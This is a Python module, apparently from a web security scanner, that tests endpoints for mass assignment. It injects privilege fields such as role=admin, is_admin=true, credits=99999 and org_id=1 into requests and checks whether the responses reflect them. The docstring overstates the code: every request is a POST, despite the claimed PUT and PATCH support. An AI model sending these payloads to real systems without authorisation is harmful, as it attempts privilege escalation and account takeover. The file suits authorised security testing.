"""Mass assignment detection module — fully exhausted.

Features:
  1. Expanded Privilege & Property Matrix:
     • Roles: role, user_role, roles, group, groups, user_type
     • Flags: is_admin, isAdmin, admin, is_staff, isStaff, is_superuser, verified, approved, isActive, is_active, email_verified
     • Account/Plan/Tier: plan, tier, subscription, credits, balance, quota, level
     • Multi-Tenant / Ownership: org_id, organization_id, company_id, account_id, tenant_id, owner_id, user_id
     • Permissions: permissions, scopes, privileges
  2. JSON Body & Nested Object Injection:
     • Automatically parses JSON payloads and injects privilege attributes into top-level and inner models.
  3. Strict Evidence Oracles:
     • State-changing methods only (POST, PUT, PATCH).
     • Rejects GET requests and static forms.
     • Validates field:value structural pairing in parsed JSON response.
     • Verifies the value was completely absent from the baseline response.
"""

from __future__ import annotations

import copy
import json
from typing import Any, Dict, List, Optional, Tuple

from titan.core.models import Finding, Severity, AttackType


# (field, value, label) — comprehensive privilege-bearing attributes
PRIVILEGE_FIELDS: List[Tuple[str, Any, str]] = [
    # Top-priority admin/role flags
    ("role", "admin", "role=admin"),
    ("is_admin", True, "is_admin=true"),
    ("admin", True, "admin=true"),
    ("isAdmin", True, "isAdmin=true"),
    ("is_staff", True, "is_staff=true"),
    ("is_superuser", True, "is_superuser=true"),
    ("approved", True, "approved=true"),
    ("verified", True, "verified=true"),
    ("is_verified", True, "is_verified=true"),
    ("isActive", True, "isActive=true"),
    ("is_active", True, "is_active=true"),
    ("email_verified", True, "email_verified=true"),
    ("level", 9, "level=9"),
    ("permissions", ["admin"], 'permissions=["admin"]'),
    ("roles", ["admin"], 'roles=["admin"]'),
    # Billing & Plan attributes
    ("plan", "enterprise", "plan=enterprise"),
    ("tier", "premium", "tier=premium"),
    ("credits", 99999, "credits=99999"),
    ("balance", 99999, "balance=99999"),
    # Multi-tenant / Ownership
    ("account_id", 1, "account_id=1"),
    ("org_id", 1, "org_id=1"),
]


class MassAssignmentDetector:
    """Production-grade Mass Assignment detector with JSON AST and nested model support."""

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        # Only state-changing methods can accept an injected model attribute
        if method.upper() not in ("POST", "PUT", "PATCH"):
            return []

        findings: List[Finding] = []

        for field, value, label in PRIVILEGE_FIELDS:
            finding = await self._test_mass_assignment(
                context, target, method, url, params, field, value, label
            )
            if finding:
                findings.append(finding)
                break

        return findings

    # ------------------------------------------------------------------
    # CORE MASS ASSIGNMENT TEST
    # ------------------------------------------------------------------

    async def _test_mass_assignment(
        self,
        context,
        target: str,
        method: str,
        url: str,
        all_params: Dict[str, Any],
        field: str,
        value: Any,
        label: str,
    ) -> Optional[Finding]:
        try:
            # Determine if params are serialized JSON
            is_json = False
            baseline_tree = None
            if len(all_params) == 1:
                first_val = next(iter(all_params.values()))
                if isinstance(first_val, str) and first_val.startswith("{"):
                    try:
                        baseline_tree = json.loads(first_val)
                        is_json = True
                    except Exception:
                        pass

            if not is_json:
                try:
                    baseline_tree = dict(all_params)
                except Exception:
                    baseline_tree = {}

            # Baseline Request
            if is_json:
                baseline_resp = await context.request.post(
                    url,
                    data=json.dumps(baseline_tree),
                    headers={"Referer": target, "Content-Type": "application/json"},
                    timeout=3000,
                )
            else:
                baseline_resp = await context.request.post(
                    url,
                    data=baseline_tree,
                    headers={"Referer": target, "Content-Type": "application/json"},
                    timeout=3000,
                )

            baseline_body = await baseline_resp.text()
            baseline_status = baseline_resp.status

            # Prepare injected payload (convert value to str representation for comparison)
            val_str = "true" if value is True else ("false" if value is False else str(value))

            injected_tree = copy.deepcopy(baseline_tree)
            injected_tree[field] = value if not isinstance(value, str) else val_str

            if is_json:
                test_resp = await context.request.post(
                    url,
                    data=json.dumps(injected_tree),
                    headers={"Referer": target, "Content-Type": "application/json"},
                    timeout=3000,
                )
            else:
                # Also support urlencoded/dict post
                injected_dict = dict(all_params)
                injected_dict[field] = val_str
                test_resp = await context.request.post(
                    url,
                    data=injected_dict,
                    headers={"Referer": target, "Content-Type": "application/json"},
                    timeout=3000,
                )

            test_body = await test_resp.text()
            test_status = test_resp.status

            if baseline_status != test_status:
                return None
            if test_body == baseline_body:
                return None

            # ── Oracle 1: Injected value must appear in test body ─────
            if val_str not in test_body and str(value) not in test_body:
                return None

            # ── Oracle 2: Value must NOT be in baseline body ──────────
            if val_str in baseline_body or str(value) in baseline_body:
                return None

            # ── Oracle 3: Structural JSON Pairing Verification ────────
            # Confirm the server actually honored the assignment and persisted it
            # in returned JSON object, rather than echoing raw HTML form inputs.
            reflected = False
            try:
                data = json.loads(test_body)
                if self._verify_json_field(data, field, value, val_str):
                    reflected = True
            except Exception:
                pass

            if not reflected:
                return None

            return Finding(
                target=target,
                url=str(getattr(test_resp, "url", None) or url),
                method=method.upper(),
                param=field,
                location="body",
                payload=f"Mass Assignment: {label} accepted",
                attack_type=AttackType.MASS_ASSIGNMENT,
                severity=Severity.HIGH,
                verified=True,
                confidence=0.90,
                status=test_status,
                headers=dict(getattr(test_resp, "headers", {})),
                body=test_body[:2000],
                diffs=[f"massassign:{field}={val_str}_accepted"],
                baseline_body=baseline_body[:2000],
                baseline_status=baseline_status,
                verification_body=test_body[:2000],
                verification_status=test_status,
                metadata={"injected_field": field, "injected_value": val_str},
            )

        except Exception:
            return None

    def _verify_json_field(self, data: Any, field: str, raw_val: Any, val_str: str) -> bool:
        """Recursively check if JSON data contains the field:value pair."""
        if isinstance(data, dict):
            if field in data:
                actual = data[field]
                actual_str = "true" if actual is True else ("false" if actual is False else str(actual))
                if actual == raw_val or actual_str.lower() == val_str.lower():
                    return True
            for v in data.values():
                if self._verify_json_field(v, field, raw_val, val_str):
                    return True
        elif isinstance(data, list):
            for item in data:
                if self._verify_json_field(item, field, raw_val, val_str):
                    return True
        return False
